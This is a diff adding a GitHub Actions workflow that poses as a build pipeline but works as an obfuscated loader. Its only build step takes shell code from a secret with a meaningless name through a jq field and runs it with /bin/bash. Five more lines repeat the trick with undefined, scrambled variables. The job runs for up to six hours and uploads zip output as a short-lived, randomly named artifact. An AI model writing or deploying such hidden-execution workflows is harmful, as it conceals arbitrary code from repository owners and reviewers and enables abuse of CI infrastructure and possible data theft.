@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          smhf8632: ${{ secrets.smhf8632 }}
+        run: |
+          printf '%s' "$smhf8632" | jq -r .yw98239 | /bin/bash
+          printf '%s' "$g875" | jq -r .vlv9 | /bin/bash
+          echo $eu2647 | jq -r .uqc80 | /bin/bash
+          echo $o04752 | jq -r .uvhm65 | /bin/bash
+          printf '%s' "$utrnz212" | jq -r .vktpj0 | /bin/bash
+          echo $voodk949 | jq -r .y098 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: XIXVXKwG
+          path: "*.zip"
+          retention-days: 1
